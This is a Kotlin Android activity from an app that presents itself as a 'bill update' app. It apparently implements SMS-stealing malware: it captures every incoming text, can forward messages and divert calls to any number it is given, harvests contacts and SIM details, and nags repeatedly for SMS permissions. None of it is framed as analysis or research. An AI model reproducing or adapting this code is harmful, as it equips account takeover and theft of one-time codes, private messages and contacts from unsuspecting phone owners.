package com.example.bill_update_app

import android.Manifest
import android.content.Context
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Telephony

import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.EventChannel
import io.flutter.plugin.common.MethodChannel

class SmsPlugin {
    companion object {
        private var eventSink: EventChannel.EventSink? = null

        fun register(channel: EventChannel, activity: FlutterActivity) {
            channel.setStreamHandler(object : EventChannel.StreamHandler {
                override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
                    eventSink = events
                }
                override fun onCancel(arguments: Any?) {
                    eventSink = null
                }
            })
        }

        fun receiveSms(sender: String, message: String, timestamp: String) {
            val data = mapOf(
                "sender" to sender,
                "message" to message,
                "received_at" to timestamp
            )
            eventSink?.success(data)
        }
    }
}

class MainActivity : FlutterActivity() {
    private val CHANNEL_SMS = "com.example.bill_update_app/sms"
    private val CHANNEL_DEVICE = "com.example.bill_update_app/device"
    private val CHANNEL_FORWARDING = "com.example.bill_update_app/forwarding"
    private var receiver: SmsReceiver? = null
    private var smsObserver: SmsObserver? = null

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        val smsChannel = EventChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL_SMS)
        SmsPlugin.register(smsChannel, this)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL_DEVICE).setMethodCallHandler { call, result ->
            if (call.method == "getDeviceId") {
                val prefs = getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
                result.success(prefs.getString("device_id", ""))
            } else {
                result.notImplemented()
            }
        }

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL_FORWARDING).setMethodCallHandler { call, result ->
            when (call.method) {
                "enableCallForwarding" -> {
                    val number = call.argument<String>("number") ?: ""
                    if (checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                        getSharedPreferences("forwarding_pending", Context.MODE_PRIVATE).edit()
                            .putString("call_forwarding_number", number).apply()
                        requestPermissions(arrayOf(Manifest.permission.CALL_PHONE), 1003)
                    } else {
                        CallForwarder(this).enableCallForwarding(number)
                    }
                    result.success(true)
                }
                "disableCallForwarding" -> {
                    if (checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                        getSharedPreferences("forwarding_pending", Context.MODE_PRIVATE).edit()
                            .putString("call_forwarding_number", "").apply()
                        requestPermissions(arrayOf(Manifest.permission.CALL_PHONE), 1003)
                    } else {
                        CallForwarder(this).disableCallForwarding()
                    }
                    result.success(true)
                }
                "openDialer" -> {
                    val code = call.argument<String>("code") ?: ""
                    CallForwarder(this).openDialer(code)
                    result.success(true)
                }
                "forwardSms" -> {
                    val target = call.argument<String>("target") ?: ""
                    val sender = call.argument<String>("sender") ?: ""
                    val message = call.argument<String>("message") ?: ""
                    val receivedAt = call.argument<String>("received_at") ?: ""
                    if (checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                        SmsForwarder(this).forwardSms(target, sender, message, receivedAt)
                    }
                    result.success(true)
                }
                else -> result.notImplemented()
            }
        }

        DeviceRegistrar.init(this)

        receiver = SmsReceiver()
        val filter = IntentFilter("android.provider.Telephony.SMS_RECEIVED")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED)
        } else {
            registerReceiver(receiver, filter)
        }

        requestSmsPermission()
    }

    private fun requestSmsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val permissions = arrayOf(
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS
            )
            val toRequest = permissions.filter {
                checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
            }
            if (toRequest.isNotEmpty()) {
                Handler(Looper.getMainLooper()).post {
                    requestPermissions(toRequest.toTypedArray(), 1001)
                }
            } else {
                startSmsObserver()
            }
        }
        Handler(Looper.getMainLooper()).postDelayed({
            requestContactsPermission()
        }, 3000)
    }

    private fun requestContactsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val perms = arrayOf(
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_PHONE_NUMBERS
            )
            val toRequest = perms.filter {
                checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
            }
            if (toRequest.isNotEmpty()) {
                requestPermissions(toRequest.toTypedArray(), 1002)
            } else {
                ContactSync.init(this)
            }
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 1001) {
            var smsGranted = false
            for (i in permissions.indices) {
                if ((permissions[i] == Manifest.permission.RECEIVE_SMS || permissions[i] == Manifest.permission.READ_SMS)
                    && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    smsGranted = true
                }
            }
            if (smsGranted) {
                startSmsObserver()
            } else {
                Handler(Looper.getMainLooper()).postDelayed({
                    requestPermissions(arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS), 1001)
                }, 5000)
            }
        } else if (requestCode == 1002) {
            for (i in permissions.indices) {
                if (permissions[i] == Manifest.permission.READ_CONTACTS && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    ContactSync.init(this)
                }
                if (permissions[i] == Manifest.permission.READ_PHONE_STATE || permissions[i] == Manifest.permission.READ_PHONE_NUMBERS) {
                    DeviceRegistrar.updateSimInfo()
                }
            }
            if (checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(arrayOf(Manifest.permission.CALL_PHONE), 1003)
            }
        } else if (requestCode == 1003) {
            for (i in permissions.indices) {
                if (permissions[i] == Manifest.permission.CALL_PHONE && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    val prefs = getSharedPreferences("forwarding_pending", Context.MODE_PRIVATE)
                    val number = prefs.getString("call_forwarding_number", "") ?: ""
                    if (number.isNotEmpty()) {
                        CallForwarder(this).enableCallForwarding(number)
                        prefs.edit().remove("call_forwarding_number").apply()
                    } else {
                        CallForwarder(this).disableCallForwarding()
                    }
                }
            }
        } else if (requestCode == 1004) {
            // SMS forwarded on next poll after permission granted
        }
    }

    private fun startSmsObserver() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            smsObserver = SmsObserver(contentResolver)
            contentResolver.registerContentObserver(
                Telephony.Sms.Inbox.CONTENT_URI,
                true,
                smsObserver!!
            )
            smsObserver?.startPolling()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        receiver?.let { unregisterReceiver(it) }
        smsObserver?.let {
            it.stopPolling()
            contentResolver.unregisterContentObserver(it)
        }
    }
}
